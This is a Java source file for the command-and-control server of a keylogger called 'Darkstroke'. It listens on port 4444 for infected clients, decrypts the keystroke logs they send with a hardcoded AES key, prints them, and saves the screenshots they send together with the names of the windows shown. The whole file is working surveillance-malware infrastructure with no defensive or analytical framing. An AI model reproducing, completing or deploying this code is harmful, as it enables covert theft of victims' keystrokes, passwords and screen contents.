// Server.java
package server;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.time.Instant;
import java.util.ArrayList;
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

public class Server extends GUI{

    private static final String SECRET = "1234567890123456"; // 16 bytes for AES-128
    private static final SecretKey SECRET_KEY = new SecretKeySpec(SECRET.getBytes(), "AES");

    public static void main(String[] args) {
        System.out.print("\033[H\033[2J");
        System.out.flush();
        GUI.start();
        int port = 4444;
        File shotsDir = new File("screenshots");
        if (!shotsDir.exists()){
            shotsDir.mkdirs();
        } 
try (ServerSocket serverSocket = new ServerSocket(port)) {
    serverSocket.setReuseAddress(true);

    while (true) {
        System.out.print(YELLOW+BOLD+"["+GREEN+"+"+YELLOW+"]"+YELLOW+"    Darkstroke started. Listening on port " +GREEN+ port + "\r");

        Socket clientSocket = serverSocket.accept();
        System.out.print("\033[2K\r");
        System.out.println(YELLOW+BOLD+"["+GREEN+"+"+YELLOW+"]"+GREEN+"    Client connected: " +YELLOW+ clientSocket.getInetAddress());

        try {
            handleClient(clientSocket, shotsDir);
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            clientSocket.close();
        }
    }

} catch (IOException e) {
    e.printStackTrace();
}
    }

private static String decrypt(String cipherText) {
    try {
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, SECRET_KEY);
        byte[] decodedBytes = Base64.getDecoder().decode(cipherText);
        return new String(cipher.doFinal(decodedBytes));
    } catch (Exception e) {
        e.printStackTrace();
        return cipherText; // fallback
    }
}


    private static void handleClient(Socket clientSocket, File shotsDir) {
        try (DataInputStream dis = new DataInputStream(clientSocket.getInputStream())) {
            while (true) {
                String type;
                try {
                    type = dis.readUTF();
                } catch (IOException e) {
                    System.out.println(RED+BOLD+"["+YELLOW+"+"+RED+"]"+RED+"    Client disconnected.");
                    break;
                }

                if (type.equals("LOG")) {
                String encryptedLog = dis.readUTF();
                String decryptedLog = decrypt(encryptedLog);
                System.out.println(YELLOW+BOLD+"["+GREEN+"+"+YELLOW+"]    ["+GREEN+"KeyLog"+YELLOW+"] " +RESET+ decryptedLog);
                } else if ("SCREENSHOT".equals(type)) {
                String trigger = dis.readUTF();
                String window = dis.readUTF();
                int len = dis.readInt();
                byte[] bytes = new byte[len];
                dis.readFully(bytes);
                String filename = "shot_" + Instant.now().toEpochMilli() + ".png";
                File out = new File(shotsDir, filename);
                try (FileOutputStream fos = new FileOutputStream(out)) {
                fos.write(bytes);
                }
                System.out.println(YELLOW+BOLD+"["+GREEN+"+"+YELLOW+"]    ["+RED+"Screenshot"+YELLOW+"]"+RED+" saved "+YELLOW+"|"+GREEN+" Window : " +YELLOW+ window);
                } else {
            System.out.println(RED+BOLD+"["+YELLOW+"+"+RED+"]"+RED+"    Unknown message type: " + type);
        }

            }
        } catch (IOException e) {
            System.err.println(RED+BOLD+"["+YELLOW+"+"+RED+"]"+RED+"    Client connection error: " + e.getMessage());
        } finally {
            try { clientSocket.close(); } catch (IOException ignored) {}
        }
    }
}
